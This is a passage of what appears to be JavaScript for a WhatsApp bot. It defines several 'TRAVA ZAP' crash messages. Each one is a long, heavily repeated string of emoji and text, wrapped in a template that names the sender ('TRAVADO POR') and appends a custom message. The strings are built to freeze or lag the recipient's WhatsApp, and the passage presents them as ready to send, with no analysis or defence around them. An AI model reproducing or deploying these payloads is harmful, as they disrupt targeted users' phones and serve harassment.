⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺\n\nMensagem : ${pesan}`
                       const teks2 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nTRAVA: TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺\n\nMensagem : ${pesan}`
                       const teks3 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nTRAVA: TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺\n\nMensagem : ${pesan}`
                       const teks4 = `*[TRAVA🐊🚩]*\nTRAVADO POR : @${nomor.split("@s.whatsapp.net")[0]}\nTRAVA: TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅TRAVA ZAP ⭐🤙😠🤙😳🤙🥺👉🥺💅🥺💅🥺💅💅🥺TRAVA 